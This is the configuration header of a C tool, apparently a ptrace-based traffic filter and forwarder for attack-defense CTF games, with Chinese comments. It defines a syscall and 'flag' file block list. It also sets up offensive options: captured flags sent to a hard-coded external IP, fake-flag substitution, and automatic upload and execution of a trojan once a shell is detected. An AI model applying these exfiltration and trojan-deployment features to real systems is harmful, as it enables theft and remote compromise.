#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/sched.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#define JM_XORSTR_DISABLE_AVX_INTRINSICS
#include "XorString.hpp"

#define NORMAL_SYSCALL(x)   \
    (                       \
        x == __NR_read ||   \
        x == __NR_write ||  \
        x == __NR_open ||   \
        x == __NR_execve || \
        x == __NR_fork ||   \
        x == __NR_openat)

#define DANGEROUS_SYSCALL(x) \
    (                        \
        x == __NR_fork ||    \
        x == __NR_clone3)
#define OPEN_SYSCALL(x)     \
    (                       \
        x == __NR_open ||   \
        x == __NR_openat || \
        x == __NR_openat2)
#define BUFFER_SIZE 0x20000
#define CATCH 1               // MODE protect 保护模式：拦截系统调用和违规文件读取，并记录每一次的流量
#define FORWARD 2             // MODE forward 转发模式：选择其它机器，将流量转发并记录
#define MULTI_FORWARD 3       // MODE 多路转发模式：随机转发给IP列表中的其中一个，并记录流量
#define MODE CATCH          // 在这里选择你的模式
#define LOG_PATH "/tmp/.waf/" // 流量记录的目录

#if MODE == CATCH

#define EXECVE_ABORT 0           // 拦截一切 execve
#define EXECVE_CONT 1            // 只记录execve的行为
#define EXECVE_MODE EXECVE_ABORT // 表明你要拦截execve还是忽略execve
#define FILE_BLACK "flag"        // 当尝试open系统调用打开文件时，存在该字符直接返回失败
#define FILE_WHITE "libc.so.6"   // 当尝试open系统调用打开文件时，存在该字符则不记录
#define RUN_PATH "/tmp/pwn"      // 主程序运行的位置
#define MODE_READ 0
#define MODE_WRITE 1

#elif MODE == FORWARD

#define FORWARD_IP "127.0.0.1" // 你要转发的IP地址
#define FORWARD_PORT 8889      // 你要转发的端口

#elif MODE == MULTI_FORWARD

#define FORWARD_IP_List { \
    "10.1.1.1",           \
    "10.1.1.2",           \
} // 这里是你要转发的IP的列表
#define FORWARD_PORT 9999 // 我们默认认为，就算IP不同，端口也应该是相同的，如果不是，请勿用多路转发模式

#endif
// 转发模式都要进行的一个配置，非转发模式不用看下面
#if MODE != CATCH

#define MODE_SEND 0
#define MODE_RECV 1
#define MODE_PRESUF 0 // 首尾匹配模式
#define MODE_REG 1    // 正则匹配模式
#define MATCH_MODE MODE_PRESUF
#define PREFIX "flag{"                 // flag开头
#define SUFFIX "}"                     // flag末尾，有且仅有一个字符
#define REG_RULE ""                    // 未开通，别选
#define CHEAT 1                        // 指示要不要进行flag欺骗，0表示不欺骗
#define CHEAT_TABLE "0123456789abcdef" // 将flag字符替随机替换的表
#define ROUND_TIME 300                 // 每一轮隔多少秒，保证在一轮的时间内，替换的flag完全一样
#define FLAG_SERVER "8.153.71.247"     // 指示将得到的flag弹往哪个IP
#define FLAG_PORT 9999                 // 指示将得到的flag弹往哪个端口
#define AES_KEY "xia0ji233_wants_"     // AES 加密密钥
#define AES_IV "a_girlfriend!!!!"      // AES 加密初始向量
#define UPLOAD_SHELL 1                 // 检测到shell之后，是否上传木马执行，0表示不执行
#define USER "ctf"                     // 检测运行服务的用户，通常用于检测shell是否成功
#define SHELL_PATH "/tmp/xsh"          // 上传木马的位置，在你本机的位置，而不是上传的位置
#define SHELL_SIZE 10 * 1024 * 1024    // 木马的大小，字节为单位，小于这个值即可
#define TMPFILE "/tmp/xia0ji233"       // 临时文件名，base64编码过的
#define SHELL_EXECUTE "/tmp/Xsh"       // 木马最终路径

#endif
